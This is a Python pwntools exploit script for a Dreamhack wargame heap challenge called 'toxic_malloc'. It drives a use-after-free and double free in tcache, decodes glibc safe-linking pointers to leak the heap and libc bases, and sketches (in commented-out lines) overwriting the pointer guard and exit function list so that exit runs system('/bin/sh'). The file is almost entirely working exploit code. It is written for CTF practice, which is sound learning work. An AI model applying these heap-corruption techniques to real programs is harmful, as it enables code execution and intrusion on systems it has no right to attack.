from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'new-window']

env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
rem = process("./Pwnable/toxic_malloc/problem/deploy/chall", env=env)
# port = 18595
# rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")

def safe_link(pos, ptr):
  return (pos >> 12) ^ ptr

def decrypt_safe_linking(ptr):
  _12bits = []
  dec = 0
  while ptr != 0:
    _12bits.append(ptr & 0xfff)
    ptr = ptr >> 12

  x = _12bits.pop()
  while len(_12bits) > 0:
    dec |= x
    dec = dec << 12
    y = _12bits.pop()
    x = x ^ y
  dec |= x

  return dec

def create(idx, data):
  rem.sendlineafter(b'choice:', b"1")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendafter(b': ', data)

def update(idx, data):
  rem.sendlineafter(b'choice:', b"2")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendafter(b': ', data)

def read(idx):
  rem.sendlineafter(b'choice:', b"3")
  rem.sendlineafter(b": ", str(idx).encode())
  rem.recvuntil(b"data: ")
  return rem.recvline()

def delete(idx):
  rem.sendlineafter(b'choice:', b"4")
  rem.sendlineafter(b": ", str(idx).encode())

def exit():
  rem.sendlineafter(b'choice:', b"5")

gdb.attach(rem)

create(0, b'A' * 8)
create(1, b'A' * 8)

delete(0)
update(0, p64(0) * 2)
delete(0)
heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0
print(hex(heap_base))


for i in range(1, 7):
  update(0, p64(0) * 2)
  delete(0)

lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
exit_funcs = lib_base + 0x219838
fs_base = lib_base - 0x28c0
initial = lib_base + 0x21af00
fake_exit_function_list = heap_base + 0x2a8
dl_fini_addr = lib_base + 0x3ab040
print(hex(lib_base))

# update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
# create(2, p64(safe_link(heap_base+0x2a0, fs_base+0x30)))
# create(3, b"A" * 16)
# create(4, p64(0) * 2)


# delete(4)
# update(4, b"B" * 16)
# create(4, p64(safe_link(heap_base+0x2a0, exit_funcs-8)))
# create(4, p64(fake_exit_function_list)*2)

# create(0, p64(1) + p64(4)) # idx, flavor
# create(1, p64(rol(lib_base+lib.symbols['system'], 0x11, word_size=64)) + p64(heap_base + 0x2a0))

# create(2, b'/bin/sh')

exit()

print(rem.recvline())

rem.interactive()